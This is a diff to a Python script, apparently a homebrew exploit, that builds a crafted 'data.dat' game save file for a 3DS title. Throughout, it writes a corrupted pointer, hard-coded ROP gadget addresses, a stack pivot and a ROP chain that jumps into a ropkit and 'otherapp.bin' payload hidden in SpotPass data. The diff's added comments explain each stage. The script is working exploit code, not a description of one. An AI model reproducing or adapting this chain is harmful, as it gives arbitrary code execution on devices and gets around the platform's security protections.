@@ -2,14 +2,14 @@ import os,sys,struct
 #1bf70
 size=0x127c1c  #size of data.dat
 d=0x33333333   #fuzz filler base value
-out=bytearray(size)
+out=bytearray(size)  #will become "data.dat" extdata file shortly, where our exploit lives. Love that filename because I love.lov it.
 OFFSET=0
 
-redirect_offs=0x1bf5c  #data.dat offset, this is where exploit begins when this pointer is redirected (pointer is hidden with a conversion algo, see addr_convert)
-linearmem_target=0x1574e790  #  start of initial takeover rop
-pop_r4r7pc=0x100e60  #pop {r4, r5, r6, r7, pc}  # pc of initial pivot
-pivot_args=0x244e08  #ldm r0, {r0, r1} ; ldr r2, [r0] ; ldr r2, [r2, #0xc] ; blx r2   setup r0/r1 for below stack pivot
-pivot=0x12f6c0  #mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
+redirect_offs=0x1bf5c  			#data.dat offset, this is where exploit begins when this pointer is redirected (pointer is hidden with a conversion algo, see addr_convert)
+linearmem_target=0x1574e790  	#start of initial takeover rop
+pop_r4r7pc=0x100e60  			#pop {r4, r5, r6, r7, pc}  # pc of initial pivot
+pivot_args=0x244e08  			#ldm r0, {r0, r1} ; ldr r2, [r0] ; ldr r2, [r2, #0xc] ; blx r2   setup r0/r1 for below stack pivot
+pivot=0x12f6c0  				#mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
 
 PAYLOAD_ADDR=0x1579e080  #ropkit to pivot to, finishing stage0. ropkit is embedded in the spotpass file  (weird charactor name inside boss/
 POP_R1PC=0x00109d6c
@@ -22,11 +22,13 @@ def write32(offset, value):
 	global out
 	out[offset:offset+4]=struct.pack("<I",value)
 	
+#simple rop chain maker
 def rop(value):
 	global out, OFFSET
 	out[OFFSET:OFFSET+4]=struct.pack("<I",value)
 	OFFSET+=4
 	
+#possible address obfuscation undoing function. did that sentence make any sense? lol
 def addr_convert(addr):
 	c=(addr - 0x678d88) // 8
 	print(hex(c))
@@ -38,11 +40,11 @@ for i in range(0,size-1,4):  #fuzz code that fills data.dat. sequentially marked
 	temp=d+(i//4)
 	out[i:i+4]=struct.pack("<I",temp)
 	
-write32(redirect_offs, addr_convert(linearmem_target))  #apply inital redirect. we're right next to an r1 branch in abount 4-5 instructions!
+write32(redirect_offs, addr_convert(linearmem_target))  #apply inital redirect and point to the ropchain below. we're right next to an r1 branch in abount 4-5 instructions!
 
-out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20   #this is close to the redirect address and seems to keep some addresses from crashing
+out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20   #this 0x20 byte null array is close to the redirect address and seems to keep some addresses from crashing
 	
-OFFSET=0x1bf90         #take control then pivot to ropkit
+OFFSET=0x1bf90         #ROPCHAIN - take control then pivot to ropkit that's embedded in spotpass data
 rop(linearmem_target)
 rop(pop_r4r7pc)
 rop(pivot_args)
@@ -52,6 +54,8 @@ rop(PAYLOAD_ADDR)
 rop(POP_R1PC)
 rop(ROP_POPPC)
 rop(pivot)
+
+#data.dat is a bad candidate for "piggybacking" further data because the game randomly copies 00s over it in many spots. we'll use spotpass data instead, even though it forces users to leave wifi off, lol (because of overwrite risk).
 
 #summary: concat ropkit and otherapp and place into the spotpass file, then the exploit code into data.dat
 with open("3ds_ropkit/otherapp.bin","rb") as f:  
